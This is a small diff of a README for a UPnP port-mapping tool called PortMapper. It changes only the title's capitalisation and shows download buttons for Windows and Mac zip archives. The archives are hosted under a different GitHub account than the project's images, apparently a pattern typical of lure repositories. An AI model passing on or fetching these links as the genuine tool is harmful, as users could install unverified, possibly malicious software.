@@ -1,4 +1,4 @@
-# PortMapper
+# Portmapper
 ![PortMapper](https://github.com/upnpportmapper/download/blob/main/images/tool.jpeg?raw=true)
 ## Download
 [![PortMapper Windows](https://github.com/upnpportmapper/download/blob/main/images/windows.png?raw=true)](https://github.com/appdownloads/software/raw/main/upnp-portmapper-windows.zip)  |  [![PortMapper Mac](https://github.com/upnpportmapper/download/blob/main/images/mac.png?raw=true)](https://github.com/appdownloads/software/raw/main/upnp-portmapper-mac.zip)
